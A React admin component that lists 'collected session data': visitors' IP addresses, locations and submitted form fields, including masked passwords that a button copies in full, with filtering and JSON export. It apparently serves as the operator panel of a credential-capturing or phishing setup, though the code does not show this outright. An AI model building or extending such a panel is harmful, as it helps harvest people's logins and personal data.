
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { 
  Copy, 
  Database, 
  Download, 
  Filter, 
  Search 
} from 'lucide-react';
import { useSessionContext } from '@/contexts/SessionContext';
import { toast } from '@/hooks/use-toast';

const AdminData = () => {
  const { sessions = [], exportSessionData = () => {} } = useSessionContext();
  
  const [searchQuery, setSearchQuery] = useState('');
  const [pageTypeFilter, setPageTypeFilter] = useState('');
  const [userFilter, setUserFilter] = useState('');
  const [filteredData, setFilteredData] = useState(sessions);
  
  // Update filtered data when sessions change
  useEffect(() => {
    setFilteredData(sessions);
  }, [sessions]);

  const applyFilters = () => {
    let filtered = sessions;
    
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(session => 
        session.id.toLowerCase().includes(query) || 
        session.data.some(entry => 
          JSON.stringify(entry).toLowerCase().includes(query)
        )
      );
    }
    
    if (pageTypeFilter) {
      filtered = filtered.filter(session => session.pageType === pageTypeFilter);
    }
    
    if (userFilter) {
      filtered = filtered.filter(session => session.id === userFilter);
    }
    
    setFilteredData(filtered);
    
    toast({
      title: "Filters Applied",
      description: `Showing ${filtered.length} results`
    });
  };

  const resetFilters = () => {
    setSearchQuery('');
    setPageTypeFilter('');
    setUserFilter('');
    setFilteredData(sessions);
    
    toast({
      title: "Filters Reset",
      description: "Showing all sessions"
    });
  };

  const exportAllData = () => {
    const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
      JSON.stringify(filteredData, null, 2)
    )}`;
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute('href', dataStr);
    downloadAnchorNode.setAttribute('download', 'all_session_data.json');
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
    
    toast({
      title: "Data Exported",
      description: `Exported ${filteredData.length} sessions`
    });
  };

  const getUniquePageTypes = () => {
    return Array.from(new Set(sessions.map(session => session.pageType))).filter(Boolean);
  };

  const getUniqueUsers = () => {
    return Array.from(new Set(sessions.map(session => session.id)));
  };

  const formatTimestamp = (timestamp: string) => {
    return new Date(timestamp).toLocaleString();
  };

  const handleCopyValue = (value: any) => {
    navigator.clipboard.writeText(typeof value === 'object' ? JSON.stringify(value) : value.toString());
    toast({
      title: "Copied to clipboard",
      description: "Value has been copied to clipboard"
    });
  };

  return (
    <div className="container mx-auto animate-fade-in">
      <div className="flex justify-between items-center mb-8">
        <div>
          <h1 className="text-3xl font-bold">Session Data</h1>
          <p className="text-muted-foreground">View and export collected session data</p>
        </div>
        <Button onClick={exportAllData}>
          <Download className="mr-2 h-4 w-4" /> Export All Data
        </Button>
      </div>

      <Card className="mb-6">
        <CardHeader>
          <CardTitle className="text-lg">Data Filters</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <Label htmlFor="search">Search</Label>
              <div className="flex items-center mt-1">
                <Input 
                  id="search" 
                  placeholder="Search session ID, IP, or data..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="flex-1"
                />
                <Button variant="ghost" size="icon" className="ml-2">
                  <Search className="h-4 w-4" />
                </Button>
              </div>
            </div>
            
            <div>
              <Label htmlFor="pageType">Page Type</Label>
              <Select value={pageTypeFilter} onValueChange={setPageTypeFilter}>
                <SelectTrigger id="pageType" className="mt-1">
                  <SelectValue placeholder="All Page Types" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="">All Page Types</SelectItem>
                  {getUniquePageTypes().map((pageType, idx) => (
                    <SelectItem key={idx} value={pageType || ""}>{pageType || "Unknown"}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            
            <div>
              <Label htmlFor="user">Session</Label>
              <Select value={userFilter} onValueChange={setUserFilter}>
                <SelectTrigger id="user" className="mt-1">
                  <SelectValue placeholder="All Sessions" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="">All Sessions</SelectItem>
                  {getUniqueUsers().map((sessionId, idx) => (
                    <SelectItem key={idx} value={sessionId}>{sessionId}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </div>
          
          <div className="flex justify-end mt-4">
            <Button variant="outline" onClick={resetFilters} className="mr-2">
              Reset
            </Button>
            <Button onClick={applyFilters}>
              <Filter className="mr-2 h-4 w-4" /> Apply Filters
            </Button>
          </div>
        </CardContent>
      </Card>

      {filteredData.length === 0 ? (
        <div className="bg-card rounded-lg p-8 text-center border">
          <div className="mb-4 text-muted-foreground">
            <Database className="h-12 w-12 mx-auto" />
          </div>
          <h3 className="text-lg font-medium mb-2">No data found</h3>
          <p className="text-muted-foreground mb-4">Try adjusting your filters</p>
          <Button variant="outline" onClick={resetFilters}>
            Reset Filters
          </Button>
        </div>
      ) : (
        <div>
          {filteredData.map(session => (
            <Card key={session.id} className="mb-6 hover:bg-accent/5">
              <CardHeader className="pb-3">
                <div className="flex justify-between items-center">
                  <CardTitle>Session: {session.id}</CardTitle>
                  <Button variant="outline" size="sm" onClick={() => exportSessionData(session.id)}>
                    <Download className="mr-2 h-4 w-4" /> Export Session
                  </Button>
                </div>
                <div className="flex flex-wrap gap-6 text-sm text-muted-foreground mt-2">
                  <div>
                    <span className="font-medium">Page Type:</span> {session.pageType || "Unknown"}
                  </div>
                  <div>
                    <span className="font-medium">Created:</span> {new Date(session.createdAt).toLocaleString()}
                  </div>
                  <div>
                    <span className="font-medium">Entries:</span> {session.data.length}
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Timestamp</TableHead>
                      <TableHead>IP Address</TableHead>
                      <TableHead>Location</TableHead>
                      <TableHead>Submitted Data</TableHead>
                      <TableHead className="text-right">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {session.data.map((entry, index) => (
                      <TableRow key={`${session.id}-entry-${index}`}>
                        <TableCell>{formatTimestamp(entry.timestamp)}</TableCell>
                        <TableCell>{entry.ip}</TableCell>
                        <TableCell>{entry.location}</TableCell>
                        <TableCell>
                          <div className="max-h-40 overflow-y-auto">
                            {Object.entries(entry.formData || {}).map(([key, value], idx) => (
                              <div key={idx} className="flex justify-between items-center py-1 border-b last:border-0">
                                <span className="font-medium mr-2">{key}:</span>
                                <div className="flex items-center">
                                  <span className="text-sm mr-2 max-w-[200px] truncate">
                                    {key.includes('password') ? '••••••••' : value}
                                  </span>
                                  <Button 
                                    variant="ghost" 
                                    size="icon" 
                                    className="h-6 w-6" 
                                    onClick={() => handleCopyValue(value)}
                                  >
                                    <Copy className="h-3.5 w-3.5" />
                                  </Button>
                                </div>
                              </div>
                            ))}
                          </div>
                        </TableCell>
                        <TableCell className="text-right">
                          <Button 
                            variant="ghost" 
                            size="sm" 
                            className="text-xs"
                            onClick={() => handleCopyValue(entry.formData)}
                          >
                            <Copy className="h-3.5 w-3.5 mr-1" /> Copy All
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );
};

export default AdminData;
